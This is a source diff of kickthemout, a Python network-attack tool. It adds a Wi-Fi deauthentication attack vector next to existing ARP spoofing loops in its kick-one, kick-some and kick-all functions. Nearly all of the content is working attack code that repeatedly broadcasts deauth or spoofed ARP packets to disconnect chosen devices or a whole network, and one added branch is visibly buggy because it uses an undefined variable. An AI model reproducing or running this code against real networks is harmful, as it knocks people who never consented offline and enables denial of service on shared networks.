@@ -35,7 +35,8 @@ except KeyboardInterrupt:
     shutdown()
 except:
     print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.").format(RED)
-    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
+    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n\n{2}Details: " + str(sys.exc_info()[1] ) + "{3}").format(RED, BLUE, RED, END)
+    #print("Details: " + sys.exc_info())
     raise SystemExit
 
 
@@ -198,21 +199,21 @@ def retrieveMACAddress(hosts):
 # non interactive attack
 def nonInteractiveAttack():
 
-    print("\n{0}nonInteractiveAttack{1}" + "/{2}" + attackVector  + "{3} activated...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
+    print("\n{0}nonInteractiveAttack{1}/{2}" + attackVector  + "{3} activated...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
 
     target = options.targets
 
     print("\n{0}Targets: {1}" + ", ".join(target)).format(GREEN, END)
 
-    print("\n{0}Spoofing started... {1}").format(GREEN, END)
 
     defaultGatewayIP = getGatewayIP()
     defaultGatewayMac = retrieveMACAddress(defaultGatewayIP)
 
     if attackVector == 'ARP':
+        print("\n{0}Spoofing started... {1}").format(GREEN, END)
         try:
             while True:
-                # broadcast malicious ARP packets (10p/s)
+                # broadcast malicious ARP packets
                 for i in target:
                     ipAddress = i
                     macAddress = retrieveMACAddress(ipAddress)
@@ -246,7 +247,36 @@ def nonInteractiveAttack():
                 reArp += 1
                 time.sleep(0.5)
             print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
-    #TODO: Implement attack vectors
+
+    elif attackVector == 'DEAUTH':
+        # <FIX>
+        header = ('\n{0}bssid{1}: '.format(BLUE, END))
+        bssid = raw_input(header)
+        # find bssid automatically
+        # </FIX>
+
+        # <FIX>
+        header = ('{0}iface{1}: '.format(BLUE, END))
+        iface = raw_input(header)
+        # </FIX>
+
+        try:
+            while True:
+                # broadcast malicious DEAUTH packets
+                for i in target:
+                    ipAddress = i
+                    macAddress = retrieveMACAddress(ipAddress)
+                    if macAddress == False:
+                        print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                        raise SystemExit
+                    spoof.sendDeauthPacket(iface, bssid, macAddress)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n{0}Stopped{1} deauth attack...{2}").format(RED, GREEN, END)
+
     else:
 
         print("\n--> {0}"+attackVector+"{1} attack vector COMING SOON...{2} <--").format(RED, GREEN, END)
@@ -257,7 +287,7 @@ def nonInteractiveAttack():
 def kickoneoff():
     os.system("clear||cls")
 
-    print("\n{0}kickONEOff{1}" + "/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
+    print("\n{0}kickONEOff{1}/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
     global stopAnimation
     stopAnimation = False
     t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
@@ -304,7 +334,7 @@ def kickoneoff():
         print("\n{0}Spoofing started... {1}").format(GREEN, END)
         try:
             while True:
-                # broadcast malicious ARP packets (10p/s)
+                # broadcast malicious ARP packets
                 spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
                 if options.packets is not None:
                     time.sleep(60/options.packets)
@@ -325,7 +355,33 @@ def kickoneoff():
                 reArp += 1
                 time.sleep(0.5)
             print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)
-    #TODO: Implement attack vectors
+
+    elif attackVector == 'DEAUTH':
+        # <FIX>
+        header = ('\n{0}bssid{1}: '.format(BLUE, END))
+        bssid = raw_input(header)
+        # find bssid automatically
+        # </FIX>
+
+        # <FIX>
+        header = ('{0}iface{1}: '.format(BLUE, END))
+        iface = raw_input(header)
+        # </FIX>
+
+        try:
+            while True:
+                # broadcast malicious DEAUTH packets
+                macAddress = oneTargetMAC
+                if macAddress == False:
+                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                    raise SystemExit
+                spoof.sendDeauthPacket(iface, bssid, macAddress)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n{0}Stopped{1} deauth attack...{2}").format(RED, GREEN, END)
     else:
 
         print("\n--> {0}"+attackVector+"{1} attack vector COMING SOON...{2} <--").format(RED, GREEN, END)
@@ -336,7 +392,7 @@ def kickoneoff():
 def kicksomeoff():
     os.system("clear||cls")
 
-    print("\n{0}kickSOMEOff{1}" + "/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
+    print("\n{0}kickSOMEOff{1}/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
     global stopAnimation
     stopAnimation = False
     t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
@@ -386,7 +442,7 @@ def kicksomeoff():
         print("\n{0}Spoofing started... {1}").format(GREEN, END)
         try:
             while True:
-                # broadcast malicious ARP packets (10p/s)
+                # broadcast malicious ARP packets
                 for i in someTargets:
                     ip = onlineIPs[int(i)]
                     for host in hostsList:
@@ -415,7 +471,36 @@ def kicksomeoff():
                 reArp += 1
                 time.sleep(0.5)
             print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
-    #TODO: Implement attack vectors
+   
+    elif attackVector == 'DEAUTH':
+        # <FIX>
+        header = ('\n{0}bssid{1}: '.format(BLUE, END))
+        bssid = raw_input(header)
+        # find bssid automatically
+        # </FIX>
+
+        # <FIX>
+        header = ('{0}iface{1}: '.format(BLUE, END))
+        iface = raw_input(header)
+        # </FIX>
+
+        try:
+            while True:
+                # broadcast malicious DEAUTH packets
+                for i in someTargets:
+                    ipAddress = i
+                    macAddress = retrieveMACAddress(ipAddress)
+                    if macAddress == False:
+                        print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                        raise SystemExit
+                    spoof.sendDeauthPacket(iface, bssid, macAddress)
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n{0}Stopped{1} deauth attack...{2}").format(RED, GREEN, END)
+
     else:
 
         print("\n--> {0}"+attackVector+"{1} attack vector COMING SOON...{2} <--").format(RED, GREEN, END)
@@ -426,7 +511,7 @@ def kicksomeoff():
 def kickalloff():
     os.system("clear||cls")
 
-    print("\n{0}kickALLOff{1}" + "/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
+    print("\n{0}kickALLOff{1}/{2}" + attackVector  + "{3} selected...{4}\n").format(RED, GREEN, BLUE, GREEN, END)
     global stopAnimation
     stopAnimation = False
     t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
@@ -450,7 +535,7 @@ def kickalloff():
 
         print("\n{0}Spoofing started... {1}").format(GREEN, END)
         try:
-            # broadcast malicious ARP packets (10p/s)
+            # broadcast malicious ARP packets
             reScan = 0
             while True:
                 for host in hostsList:
@@ -482,7 +567,35 @@ def kickalloff():
                 reArp += 1
                 time.sleep(0.5)
             print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
-    #TODO: Implement attack vectors
+    
+    elif attackVector == 'DEAUTH':
+        # <FIX>
+        header = ('\n{0}bssid{1}: '.format(BLUE, END))
+        bssid = raw_input(header)
+        # find bssid automatically
+        # </FIX>
+
+        # <FIX>
+        header = ('{0}iface{1}: '.format(BLUE, END))
+        iface = raw_input(header)
+        # </FIX>
+
+        try:
+            while True:
+                # broadcast malicious DEAUTH packets
+                ipAddress = i
+                macAddress = retrieveMACAddress(ipAddress)
+                if macAddress == False:
+                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                    raise SystemExit
+                spoof.sendDeauthPacket(iface, bssid, 'FF:FF:FF:FF:FF:FF')
+                if options.packets is not None:
+                    time.sleep(60/options.packets)
+                else:
+                    time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n{0}Stopped{1} deauth attack...{2}").format(RED, GREEN, END)
+
     else:
 
         print("{0}"+attackVector+"{1} attack vector COMING SOON...{2}").format(RED, GREEN, END)
@@ -554,7 +667,7 @@ def getDefaultInterfaceMAC():
 def resolveMac(mac):
     try:
         # send request to macvendors.co
-        url = "http://macvendors.co/api/vendorname/"
+        url = "https://macvendors.co/api/vendorname/"
         request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
         response = urllib.urlopen(request)
         vendor = response.read()
@@ -666,7 +779,7 @@ def main():
                         attackVector = 'ARP' # set arp spoof as default attack method
                         kicksomeoff()
                     elif (interactive or not interactive) and options.attack is not None:
-                        attackVector = (options.attack).upper() # set arp spoof as default attack method
+                        attackVector = (options.attack).upper()
                         kicksomeoff()
                     else:
                         print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
